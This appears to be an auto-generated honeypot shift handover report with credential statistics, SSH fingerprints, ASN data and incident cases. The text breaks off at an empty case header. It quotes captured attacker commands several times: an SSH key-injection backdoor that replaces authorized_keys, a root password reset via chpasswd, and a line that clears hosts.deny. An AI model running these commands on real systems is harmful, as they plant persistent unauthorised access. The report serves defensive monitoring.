# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-14 |
| **Generated At** | 2026-04-14T06:03:40Z |
| **Shift Time** | 06:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **440** |
| Confirmed Threats | **409** |
| False Positives Filtered | **31** (7.0%) |
| Unique Attacker IPs | **37** |
| Countries of Origin | **19** |
| High Severity Cases | **137** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **303** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **325** |
| Unique Credential Pairs | **165** |
| Unique Usernames | **62** |
| Unique Passwords | **153** |
| Successful Auth Pairs | **85** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 139 |
| `345gs5662d34` | 66 |
| `ubuntu` | 15 |
| `postgres` | 7 |
| `bot` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 66 |
| `3245gs5662d34` | 66 |
| `123456` | 7 |
| `123` | 6 |
| `test` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 66 |
| `root` | `3245gs5662d34` | 66 |
| `root` | `Admin123@@` | 3 |
| `root` | `a1234567899876543210a` | 3 |
| `root` | `Qazwsx8888!!` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `q1w2e3r4!` | `102.23.122.235` | 2026-04-14T02:15:12 |
| `root` | `3245gs5662d34` | `102.23.122.235` | 2026-04-14T02:15:19 |
| `root` | `Qazwsx8888!!` | `102.213.34.99` | 2026-04-14T02:21:07 |
| `root` | `Admin2025@123` | `102.23.122.235` | 2026-04-14T02:21:11 |
| `root` | `3245gs5662d34` | `102.213.34.99` | 2026-04-14T02:21:14 |
| `root` | `r00tr00t` | `183.150.183.20` | 2026-04-14T02:21:41 |
| `root` | `ZAQ!2wsx2024#$` | `83.219.249.173` | 2026-04-14T02:21:42 |
| `root` | `3245gs5662d34` | `183.150.183.20` | 2026-04-14T02:21:45 |
| `root` | `3245gs5662d34` | `83.219.249.173` | 2026-04-14T02:21:45 |
| `root` | `moon` | `183.150.183.20` | 2026-04-14T02:21:50 |
| `root` | `qwertyu1234567` | `183.150.183.20` | 2026-04-14T02:21:58 |
| `root` | `ccZZ111` | `102.23.122.235` | 2026-04-14T02:23:14 |
| `root` | `aA111222` | `103.161.170.12` | 2026-04-14T02:24:26 |
| `root` | `3245gs5662d34` | `103.161.170.12` | 2026-04-14T02:24:30 |
| `root` | `Qwert123456@` | `102.23.122.235` | 2026-04-14T02:25:15 |
| `root` | `Qazwsx8888!!` | `103.161.170.12` | 2026-04-14T02:25:17 |
| `root` | `Hx123456` | `152.89.253.36` | 2026-04-14T02:25:38 |
| `root` | `3245gs5662d34` | `152.89.253.36` | 2026-04-14T02:25:41 |
| `root` | `ddXX1234` | `152.89.253.36` | 2026-04-14T02:27:03 |
| `root` | `jl@123456` | `102.23.122.235` | 2026-04-14T02:27:11 |
| `root` | `QWERTY!@#$%^` | `102.23.122.235` | 2026-04-14T02:29:09 |
| `root` | `zx123456` | `103.161.170.12` | 2026-04-14T02:29:47 |
| `root` | `1234qwerasdf` | `103.161.170.12` | 2026-04-14T02:30:32 |
| `root` | `Abcd12345678@@` | `152.89.253.36` | 2026-04-14T02:31:24 |
| `root` | `qweasd123` | `103.161.170.12` | 2026-04-14T02:32:37 |
| `root` | `nas` | `103.161.170.12` | 2026-04-14T02:33:19 |
| `root` | `qazwsx11111@` | `152.89.253.36` | 2026-04-14T02:34:09 |
| `root` | `root123123@` | `152.89.253.36` | 2026-04-14T02:35:37 |
| `root` | `qwertyuiop123456789` | `152.89.253.36` | 2026-04-14T02:37:15 |
| `root` | `ZAQ!2wsx2024#$` | `152.89.253.36` | 2026-04-14T02:38:48 |
| `root` | `xxXX123` | `103.161.170.12` | 2026-04-14T02:39:54 |
| `root` | `hz@123456` | `152.89.253.36` | 2026-04-14T02:46:13 |
| `root` | `zabbix` | `152.89.253.36` | 2026-04-14T02:52:16 |
| `root` | `drcom@123` | `170.79.37.82` | 2026-04-14T02:53:19 |
| `root` | `3245gs5662d34` | `170.79.37.82` | 2026-04-14T02:53:26 |
| `root` | `123.ZXCV` | `152.89.253.36` | 2026-04-14T02:53:46 |
| `root` | `Abc.1234` | `114.220.238.30` | 2026-04-14T02:57:19 |
| `root` | `3245gs5662d34` | `114.220.238.30` | 2026-04-14T02:57:27 |
| `root` | `qazwsx999..` | `170.79.37.82` | 2026-04-14T02:58:13 |
| `root` | `Root1111#` | `153.99.92.11` | 2026-04-14T03:01:55 |
| `root` | `qwe1234567890` | `170.79.37.82` | 2026-04-14T03:04:18 |
| `root` | `pa55Word` | `121.227.152.250` | 2026-04-14T03:04:43 |
| `root` | `168168` | `153.99.92.11` | 2026-04-14T03:08:30 |
| `root` | `3245gs5662d34` | `153.99.92.11` | 2026-04-14T03:08:40 |
| `root` | `root54321..` | `170.79.37.82` | 2026-04-14T03:11:42 |
| `root` | `Or@123456` | `121.227.152.250` | 2026-04-14T03:12:05 |
| `root` | `Dsa12345` | `170.79.37.82` | 2026-04-14T03:13:13 |
| `root` | `781011` | `170.79.37.82` | 2026-04-14T03:14:47 |
| `root` | `ddQQ112233` | `170.79.37.82` | 2026-04-14T03:17:54 |
| `root` | `Lv123456` | `170.79.37.82` | 2026-04-14T03:22:23 |
| `root` | `Admin@123@` | `170.79.37.82` | 2026-04-14T03:29:52 |
| `root` | `---fuck_you----` | `222.73.134.254` | 2026-04-14T03:45:49 |
| `root` | `Admin123@@` | `103.107.60.45` | 2026-04-14T04:12:00 |
| `root` | `3245gs5662d34` | `103.107.60.45` | 2026-04-14T04:12:01 |
| `root` | `a1234567899876543210a` | `131.161.249.165` | 2026-04-14T04:12:41 |
| `root` | `3245gs5662d34` | `131.161.249.165` | 2026-04-14T04:12:48 |
| `root` | `ZAQ!2wsx321!` | `205.164.114.59` | 2026-04-14T04:18:18 |
| `root` | `3245gs5662d34` | `205.164.114.59` | 2026-04-14T04:18:24 |
| `root` | `qwer123456!` | `205.164.114.59` | 2026-04-14T04:19:42 |
| `root` | `1234QWer` | `213.6.203.226` | 2026-04-14T04:21:41 |
| `root` | `3245gs5662d34` | `213.6.203.226` | 2026-04-14T04:21:45 |
| `root` | `as` | `197.225.146.23` | 2026-04-14T04:27:02 |
| `root` | `3245gs5662d34` | `197.225.146.23` | 2026-04-14T04:27:05 |
| `root` | `Aa123456?` | `213.6.203.226` | 2026-04-14T04:27:49 |
| `root` | `qazwsx888@` | `205.164.114.59` | 2026-04-14T04:27:50 |
| `root` | `1234QWer` | `197.225.146.23` | 2026-04-14T04:28:47 |
| `root` | `Aa123456?` | `197.225.146.23` | 2026-04-14T04:30:44 |
| `root` | `a1234567899876543210a` | `213.6.203.226` | 2026-04-14T04:32:40 |
| `root` | `as` | `213.6.203.226` | 2026-04-14T04:34:12 |
| `root` | `Admin123@@` | `213.6.203.226` | 2026-04-14T04:38:54 |
| `root` | `odoo12` | `205.164.114.59` | 2026-04-14T04:40:15 |
| `root` | `root1234..` | `205.164.114.59` | 2026-04-14T04:41:36 |
| `root` | `qazwsx12#` | `197.225.146.23` | 2026-04-14T04:41:50 |
| `root` | `1Q2w3e4r5t!` | `213.6.203.226` | 2026-04-14T04:41:57 |
| `root` | `1234567890qwertyuiop` | `213.6.203.226` | 2026-04-14T04:43:34 |
| `root` | `Yc@123456` | `205.164.114.59` | 2026-04-14T04:44:32 |
| `root` | `Qwe!12345` | `197.225.146.23` | 2026-04-14T04:45:34 |
| `root` | `Abcd@123` | `205.164.114.59` | 2026-04-14T04:45:58 |
| `root` | `Qwe!12345` | `213.6.203.226` | 2026-04-14T04:48:27 |
| `root` | `a1234567899876543210a` | `197.225.146.23` | 2026-04-14T04:49:23 |
| `root` | `qazwsx12#` | `213.6.203.226` | 2026-04-14T04:51:43 |
| `root` | `Admin123@@` | `197.225.146.23` | 2026-04-14T04:53:12 |
| `root` | `1234567890qwertyuiop` | `197.225.146.23` | 2026-04-14T04:56:54 |
| `root` | `1Q2w3e4r5t!` | `197.225.146.23` | 2026-04-14T04:58:46 |
| `root` | `ubuntu` | `14.103.82.142` | 2026-04-14T05:00:05 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **440** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 404 |
| Go SSH scanner | 5 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 390 | 16 |
| `98f63c4d9c87...` | Generic scanner | 2 | 2 |
| `e37f354a101a...` | Mirai/variant | 2 | 2 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 390 | 16 | Modern SSH client |
| `95420f9d932d...` | libssh | 12 | 7 | — |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `e37f354a101a...` | libssh | 2 | 2 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 66 | 14 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:nmNzyflSlV1a"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `153.99.92.11`, `121.227.152.250`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.161.170.12`, `205.164.114.59`, `103.107.60.45`, `153.99.92.11`, `197.225.146.23`, `213.6.203.226`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **37** |
| Unique ASNs | **29** |
| High-Risk ASNs | **25** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 4 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS328154` | NETSPACE -SERVICOS DE TELECOMUNICACOES, LDA | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (137)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2f6b758b1e5a

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-04-14 02:15 |
| **Last Seen** | 2026-04-14 02:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:15:10` | `cowrie.session.connect` |
| `2026-04-14 02:15:10` | `cowrie.client.version` |
| `2026-04-14 02:15:11` | `cowrie.client.kex` |
| `2026-04-14 02:15:12` | `cowrie.login.success` |
| `2026-04-14 02:15:12` | `cowrie.session.params` |
| `2026-04-14 02:15:12` | `cowrie.command.input` |
| `2026-04-14 02:15:12` | `cowrie.command.failed` |
| `2026-04-14 02:15:13` | `cowrie.log.closed` |
| `2026-04-14 02:15:13` | `cowrie.session.params` |
| `2026-04-14 02:15:13` | `cowrie.command.input` |
| `2026-04-14 02:15:14` | `cowrie.session.file_download` |
| `2026-04-14 02:15:14` | `cowrie.log.closed` |
| `2026-04-14 02:15:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-871810757cbf

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-04-14 02:15 |
| **Last Seen** | 2026-04-14 02:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:15:17` | `cowrie.session.connect` |
| `2026-04-14 02:15:17` | `cowrie.client.version` |
| `2026-04-14 02:15:17` | `cowrie.client.kex` |
| `2026-04-14 02:15:19` | `cowrie.login.success` |
| `2026-04-14 02:15:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-257bd6d7c11c

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-04-14 02:21 |
| **Last Seen** | 2026-04-14 02:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:21:05` | `cowrie.session.connect` |
| `2026-04-14 02:21:05` | `cowrie.client.version` |
| `2026-04-14 02:21:05` | `cowrie.client.kex` |
| `2026-04-14 02:21:07` | `cowrie.login.success` |
| `2026-04-14 02:21:07` | `cowrie.session.params` |
| `2026-04-14 02:21:07` | `cowrie.command.input` |
| `2026-04-14 02:21:07` | `cowrie.command.failed` |
| `2026-04-14 02:21:08` | `cowrie.log.closed` |
| `2026-04-14 02:21:08` | `cowrie.session.params` |
| `2026-04-14 02:21:08` | `cowrie.command.input` |
| `2026-04-14 02:21:09` | `cowrie.session.file_download` |
| `2026-04-14 02:21:09` | `cowrie.log.closed` |
| `2026-04-14 02:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e51441bb9249

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-04-14 02:21 |
| **Last Seen** | 2026-04-14 02:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:21:09` | `cowrie.session.connect` |
| `2026-04-14 02:21:09` | `cowrie.client.version` |
| `2026-04-14 02:21:10` | `cowrie.client.kex` |
| `2026-04-14 02:21:11` | `cowrie.login.success` |
| `2026-04-14 02:21:11` | `cowrie.session.params` |
| `2026-04-14 02:21:11` | `cowrie.command.input` |
| `2026-04-14 02:21:11` | `cowrie.command.failed` |
| `2026-04-14 02:21:12` | `cowrie.log.closed` |
| `2026-04-14 02:21:12` | `cowrie.session.params` |
| `2026-04-14 02:21:12` | `cowrie.command.input` |
| `2026-04-14 02:21:13` | `cowrie.session.file_download` |
| `2026-04-14 02:21:13` | `cowrie.log.closed` |
| `2026-04-14 02:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b96a6195382

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-04-14 02:21 |
| **Last Seen** | 2026-04-14 02:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:21:12` | `cowrie.session.connect` |
| `2026-04-14 02:21:12` | `cowrie.client.version` |
| `2026-04-14 02:21:12` | `cowrie.client.kex` |
| `2026-04-14 02:21:14` | `cowrie.login.success` |
| `2026-04-14 02:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1e280298824

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-04-14 02:21 |
| **Last Seen** | 2026-04-14 02:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:21:16` | `cowrie.session.connect` |
| `2026-04-14 02:21:16` | `cowrie.client.version` |
| `2026-04-14 02:21:16` | `cowrie.client.kex` |
| `2026-04-14 02:21:17` | `cowrie.login.success` |
| `2026-04-14 02:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25b25c475afc

| Field | Detail |
|---|---|
| **Source IP** | `183.150.183[.]20` |
| **First Seen** | 2026-04-14 02:21 |
| **Last Seen** | 2026-04-14 02:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:21:40` | `cowrie.session.connect` |
| `2026-04-14 02:21:40` | `cowrie.client.version` |
| `2026-04-14 02:21:40` | `cowrie.client.kex` |
| `2026-04-14 02:21:41` | `cowrie.login.success` |
| `2026-04-14 02:21:41` | `cowrie.session.params` |
| `2026-04-14 02:21:41` | `cowrie.command.input` |
| `2026-04-14 02:21:41` | `cowrie.command.failed` |
| `2026-04-14 02:21:41` | `cowrie.log.closed` |
| `2026-04-14 02:21:42` | `cowrie.session.params` |
| `2026-04-14 02:21:42` | `cowrie.command.input` |
| `2026-04-14 02:21:42` | `cowrie.session.file_download` |
| `2026-04-14 02:21:42` | `cowrie.log.closed` |
| `2026-04-14 02:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.150.183[.]20` to AbuseIPDB if not already reported
- [ ] Block `183.150.183[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4013b2f88287

| Field | Detail |
|---|---|
| **Source IP** | `83.219.249[.]173` |
| **First Seen** | 2026-04-14 02:21 |
| **Last Seen** | 2026-04-14 02:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:21:41` | `cowrie.session.connect` |
| `2026-04-14 02:21:41` | `cowrie.client.version` |
| `2026-04-14 02:21:41` | `cowrie.client.kex` |
| `2026-04-14 02:21:42` | `cowrie.login.success` |
| `2026-04-14 02:21:42` | `cowrie.session.params` |
| `2026-04-14 02:21:42` | `cowrie.command.input` |
| `2026-04-14 02:21:42` | `cowrie.command.failed` |
| `2026-04-14 02:21:42` | `cowrie.log.closed` |
| `2026-04-14 02:21:42` | `cowrie.session.params` |
| `2026-04-14 02:21:42` | `cowrie.command.input` |
| `2026-04-14 02:21:43` | `cowrie.session.file_download` |
| `2026-04-14 02:21:43` | `cowrie.log.closed` |
| `2026-04-14 02:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.219.249[.]173` to AbuseIPDB if not already reported
- [ ] Block `83.219.249[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c979df1481e

